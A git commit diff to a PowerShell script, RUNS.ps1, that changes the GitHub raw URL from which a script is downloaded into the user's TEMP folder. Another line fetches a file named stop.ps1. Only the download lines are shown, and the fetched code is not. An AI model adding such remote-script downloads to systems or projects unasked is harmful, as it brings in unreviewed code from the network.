d609d248b017a499ea9462b4a0f14d7ec127ad42
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-03-01 20:01:06 +0700

    Update RUNS.ps1

--- RUNS.ps1
+++ RUNS.ps1
@@ -1,4 +1,4 @@
-$url1 = "https://raw.githubusercontent.com/cia168168/folder/main/RunV/MyScript.ps1"
+$url1 = "https://raw.githubusercontent.com/cia168168/folder/main/Scri.ps1"
 $output1 = "$env:TEMP\MyScript.ps1"
 Invoke-WebRequest -Uri $url1 -OutFile $output1
 $url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
